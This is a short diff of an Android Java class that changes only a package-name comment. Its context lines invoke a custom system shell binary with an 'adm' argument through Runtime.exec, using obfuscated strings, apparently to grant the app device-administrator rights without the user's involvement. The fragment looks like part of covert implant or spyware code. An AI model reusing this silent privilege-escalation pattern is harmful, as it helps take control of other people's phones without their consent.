@@ -271,7 +271,7 @@ public class Core extends Activity implements Runnable {
 				String bd = Configuration.shellFile + M.e(" adm");
 				String tbe = String.format("%s %s/%s", bd, pack,  M.e(".listener.AR"));
 				// /system/bin/ddf adm
-				// \"com.android.networking/com.android.networking.listener.AR\"
+				// \"com.android.dvci/com.android.dvci.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
 
 			} catch (IOException ex) {
